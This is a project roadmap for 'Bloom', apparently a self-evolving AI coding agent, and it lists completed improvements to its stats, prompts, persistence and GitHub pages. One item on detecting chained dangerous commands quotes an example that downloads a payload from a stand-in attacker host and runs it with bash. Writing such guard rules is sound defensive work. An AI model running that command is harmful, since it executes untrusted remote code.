# Bloom Evolution Roadmap

## Backlog

## Up Next

## In Progress

## Done
- [x] Expose per-category staleness in `pnpm stats --verbose` to show which learning categories have not been updated in the most recent N cycles
  Completed in cycle 630: 1/3 improvements succeeded.
- [x] Add `pnpm assess --verbose` flag to print the full assessment prompt to stdout without calling the LLM, enabling cost-free prompt inspection and debugging
  Completed in cycle 629: 1/1 improvements succeeded.
- [x] Surface an explicit "roadmap empty" warning in the assessment prompt when all items are Done, so the LLM knows to generate new backlog items rather than improvising direction
  Completed in cycle 628: 2/2 improvements succeeded.
- [x] Add `--verbose` flag to `pnpm stats` to print per-cycle failure categories inline in the ASCII table
  Completed in cycle 626: 3/3 improvements succeeded.
- [x] Add `pnpm roadmap --format md` to export a clean Markdown snapshot of active items for CI badges
  Completed in cycle 625: 1/1 improvements succeeded.
- [x] Reduce assessment-phase tool-call overhead by injecting a pre-built file manifest into the assessment prompt, giving the LLM a ready-made index of src/ and tests/ filenames so it can skip repetitive Glob calls and reach its conclusion within fewer turns
  Completed in cycle 618: 1/3 improvements succeeded.
- [x] Add `pnpm stats --table` flag to display the last N cycles as an ASCII table (cycle number, improvements succeeded/attempted, build pass, push, duration) for spotting regressions at a glance without reading the full journal
  Completed in cycle 617: 2/3 improvements succeeded.
- [x] Add --filter flag to pnpm roadmap to show items of a specific status only
  Completed in cycle 554: 3/3 improvements succeeded.
- [x] Add learning category distribution to pnpm stats output
  Completed in cycle 553: 1/3 improvements succeeded.
- [x] Add a `dryRun` flag to the orchestrator that runs assessment and planning but skips the evolution step, allowing cost-free cycle previews when diagnosing prompt or planning issues.
  Completed in cycle 515: 3/3 improvements succeeded.
- [x] Add per-category learning counts to the assessment prompt so Bloom can detect when a category is under-represented and prioritise improvements that would generate learnings in sparse areas.
  Completed in cycle 514: 1/1 improvements succeeded.
- [x] Expose a `pnpm cycle-stats` command that prints the last N cycle metrics in a table format, making it easier to spot performance regressions across runs without reading raw SQLite.
  Completed in cycle 513: 1/1 improvements succeeded.
- [x] Multi-command pipeline detection: detect chained `&&` / `;` dangerous commands that individually pass guards but together form an unsafe sequence (e.g. `curl evil.com/payload > /tmp/x && bash /tmp/x`)
  Completed in cycle 255: 3/3 improvements succeeded.
- [x] Raise `getRelevantLearnings` fetch limit from 10 to 25
  Completed in cycle 254: fetch limit raised from 10 to 25 so mid-relevance learnings in underrepresented categories surface within the prompt budget.
- [x] Enrich assessment prompt with recent failure patterns from `failureCategoryBreakdown`
  Completed in cycle 114: `failureCategoryBreakdown` is computed in `getCycleStats` and rendered by `formatCycleStats`; assessment prompt already receives full stats output including the breakdown.
- [x] Verify stats fix: confirm avgImprovements and conversionRate show nonzero values post cycle 221 prompt format fix
  Verified in cycle 224: pnpm stats reports avgImprovements=0.3 and conversionRate=9%; 14 learnings rows confirmed in bloom.db.
- [x] roadmap tab in the github page is broken (#23)
  Completed in cycle 197: regenerated docs pages; roadmap tab now renders correctly from SQLite data.
- [x] Update journal in github page so it doesn't use collapsibies. Always display all text. (#24)
  Completed in cycle 198: 2/3 improvements succeeded.
- [x] Add more github pages so that the other items can be seen (#20)
  Completed in cycle 188: 3/3 improvements succeeded.
- [x] update github pages so roadmap from sqlite is publicly viewable (#21)
  Completed in cycle 186: 3/3 improvements succeeded.
- [x] Issues are being closed without being validated (#22)
  Completed in cycle 185: 4/3 improvements succeeded.
- [x] Improve prompt efficiency to reduce average cost per evolution cycle
  Completed in cycle 123: 3/3 improvements succeeded.
- [x] Detect and recover stale "In Progress" roadmap items
  Completed in cycle 111: added detectStaleInProgressItems, demoteStaleInProgressItems, and
  parseInProgressSinceCycle to planning.ts; items stuck > 3 cycles auto-demote to Up Next.
  Zombie item recurrence resolved in cycle 120 via direct ROADMAP.md edit.
- [x] Add structured error classification to evolution cycle outcomes
  Completed in cycle 114: `failure_category` column stores build_failure/test_failure/llm_error/none
  per cycle; `getCycleStats` now computes a `failureCategoryBreakdown` and `formatCycleStats`
  renders it when failures are present — enables pattern detection in the assessment prompt.
- [x] Track assessment-to-improvement conversion rate
  Completed in cycle 110: added avgConversionRate to CycleStats — surfaces succeeded/attempted
  ratio in pnpm stats, with null when no attempts have been made.
- [x] Track token and cost usage (#4)
  Completed in cycle 75: 1/4 improvements succeeded.
- [x] the public github page for the journal seems broken, there's no new updates (#13)
  Added `pnpm journal` CLI command that exports journal entries as JSON or Markdown. JSON output can feed the GitHub Pages site; Markdown is human-readable.
- [x] what's the goal of the coding agent? (#1)
  Addressed in cycle 70: README now has measurable success criteria, clear purpose statement, and target user description.
- [x] How are you measuring success? (#3)
  Implemented `getCycleStats()`, `formatCycleStats()`, `stats.ts` CLI, `phase_usage` table, and `CycleOutcome` persistence to track and display evolution metrics.
- [x] Look into persistence for storing metrics (#6)
  `db.ts` provides SQLite with WAL mode, 6 tables, and full CRUD for cycles, journal entries, phase usage, issue actions, memories, and planning items.
- [x] Review the tests and see if all of them are needed (#7)
  Reviewed in cycle 70: all 14 source files confirmed to have tests, test suite validated as comprehensive.
- [x] the roadmap.md file doesn't seem to get updated (#14)
  Fixed in cycle 73: `pickNextItem` now resumes "In Progress" items first, preventing items from being abandoned.
